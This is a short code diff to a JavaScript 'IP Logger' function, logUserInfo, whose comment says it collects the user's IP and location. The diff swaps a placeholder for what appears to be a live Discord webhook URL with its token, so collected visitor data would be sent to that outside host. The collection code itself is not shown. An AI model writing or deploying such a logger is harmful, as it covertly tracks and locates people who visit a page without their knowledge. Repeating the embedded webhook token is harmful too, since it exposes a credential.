@@ -1,6 +1,6 @@
 // IP Logger functionality
 async function logUserInfo() {
-    const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE';
+    const webhookUrl = 'https://discord.com/api/webhooks/1384295313287942194/Dni6ZtiKcZvyagxfI56-YbICWTFISf_jm3Oec5T98DEK20GZpW_FUA1yUUk3PNUQyV5R';
     
     try {
         // Get user IP and location data
